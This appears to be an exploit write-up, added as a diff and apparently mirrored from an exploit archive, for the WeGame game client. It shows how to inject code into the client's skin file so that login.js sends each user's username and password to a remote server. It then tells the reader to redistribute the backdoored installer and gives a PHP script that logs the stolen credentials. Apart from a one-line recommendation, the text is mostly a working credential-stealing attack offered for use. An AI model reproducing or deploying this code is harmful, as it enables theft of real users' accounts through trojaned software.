@@ -1,0 +1,149 @@
+id: 18658
+date: 06/16/2012
+title: WeGame Code Execution/Credential stealing Exploit
+author: compl3x
+cves: 
+
+----------------------------------------------------------------------
+                                       888  .d8888b.
+                                       888 d88P  Y88b
+                                       888      .d88P
+ .d8888b .d88b.  88888b.d88b.  88888b.  888     8888"  888  888
+d88P"   d88""88b 888 "888 "88b 888 "88b 888      "Y8b. `Y8bd8P'
+888     888  888 888  888  888 888  888 888 888    888   X88K
+Y88b.   Y88..88P 888  888  888 888 d88P 888 Y88b  d88P .d8""8b.
+ "Y8888P "Y88P"  888  888  888 88888P"  888  "Y8888P"  888  888
+                              888
+                              888
+                              888
+----------------------------------------------------------------------
+Title: WeGame Code Execution/Credential stealing Exploit
+Author: compl3x
+Vendor: Wegame.com/Tagged.com
+Versions Affected: All
+Site: compl3x.wordpress.com
+Contact: compl3x@tormail.org
+Twitter: @Complex360
+
+----------------------------------------------------------------------
+:::SYNOPSIS:::
+----------------------------------------------------------------------
+WeGame uses a file called default.skn, found in the installation
+directory, to load skins for the WeGame client. This file is simply a 
+renamed zip archive and contains images, html files and javascript files. 
+These javascript files are not hash checked at startup, and thus, code 
+can be injected to transmit username and password to a remote server.
+
+The code below will transmit usernames and passwords to a remote server.
+However, the WeGame client will execute any javascript contained in these
+files, so there is a much wider scope to what is possible.
+
+----------------------------------------------------------------------
+:::RECOMMENDATIONS::
+----------------------------------------------------------------------
+-Implement hash checking of vital default.skn files on startup.
+
+----------------------------------------------------------------------
+:::DETAILS:::
+----------------------------------------------------------------------
+
+----------------------------------------------------------------------
+:::Part 1 - Backdooring the client:::
+----------------------------------------------------------------------
+First, lets look inside the default.skn file:
+	unzip -qq default.skn && find ./skin -name "*.js"
+
+	./skin/dl-started.js
+	./skin/login.js
+	./skin/dl-confirm.js
+	./skin/jquery-151-min.js
+
+Whilst we could theoretically inject code into the .html files also,
+the .js files are used to process actions. The one we are most 
+interested in is login.js, for this file executes a function called
+doLogin( ) when you umm...login to WeGame. dlconfirm.js and dl-started.js
+could be used to retrieve data about what's happening in-client, but that's
+not really important.
+
+So... doLogin( ) in login.js:
+
+function doLogin( )
+{
+	var pass = '';
+	// doLogin( user, pass, hashed, remember_me );
+	
+	// if we have a saved password hash and it wasn't changed, send it along
+	if ( document.getElementById('real-pw').value == edit_pw_text )
+		pass = hashed_pw;
+	else // otherwise, send whatever the user entered
+		pass = getValue( "password" );
+	wegame.doLogin( getValue( "username" ), pass, hashed, getChecked( "rememberme" ) );
+}
+
+So, we can easily grab the Values of "username" and "password".
+	creds = (getValue( "username" ) + "|" + getValue( "password" ));
+
+However, we could simply send them as PHP variables to our processing script:
+window.open("http://example.com/wegame.php?user=" + getValue( "username" ) + "&pass=" + getValue( "password" ), "Logging into WeGame...","location=1,status=0,scrollbars=0, width=0,height=0");
+
+BANG! Stick this into the doLogin( ) function, and credentials will be sent to you.
+
+function doLogin( )
+{
+	var pass = '';
+	// doLogin( user, pass, hashed, remember_me );
+	
+	// if we have a saved password hash and it wasn't changed, send it along
+	if ( document.getElementById('real-pw').value == edit_pw_text )
+		pass = hashed_pw;
+	else // otherwise, send whatever the user entered
+		pass = getValue( "password" );
+        window.open("http://example.com/wegame.php?user=" + getValue( "username" ) + "&pass=" + getValue( "password" ), "Logging into WeGame...","location=1,status=0,scrollbars=0, width=0,height=0");
+	wegame.doLogin( getValue( "username" ), pass, hashed, getChecked( "rememberme" ) );
+}
+
+Finally, re-zip the "skin" folder, stick it into the installer and distribute.
+
+----------------------------------------------------------------------
+Part 2 - setting up the server:
+----------------------------------------------------------------------
+Now you have a backdoored client and installer, it's time to setup your server:
+	
+Write your own processing script if you wish in whatever language, but here's my
+example:
+	
+<?php
+//If you don't have the username, there is no use of having the password.
+if(isset($_GET['user']))
+{
+	$user = $_GET['user'];
+	$pass = $_GET['pass'];
+	$myFile = "text.txt";
+	$fh = fopen($myFile, 'a');
+	$Data = ("$user|$pass");
+	fwrite($fh,$Data."\n");
+	fclose($fh);	
+
+	echo("<script>window.close();</script>");
+}
+//If the login process doesn't complete, the client times out with a "wrong user/pass" alert. 
+//To exfiltrate data, you NEED to terminate the window.
+else
+{
+	echo("<script>window.close();</script>");
+}
+?>
+
+As said in the comment above, the script NEEDS to terminate. My script writes window.close();
+This works fine as WeGame opens it as a child of the client (No, NoScript will NOT protect you)
+
+-compl3x(@tormail.org)
+--------------------------
+- compl3x.wordpress.com  -
+- twitter.com/complex360 -
+- github.com/compl3x	 -
+--------------------------
+
+
+
+#  0day.today [2023-03-24]  #
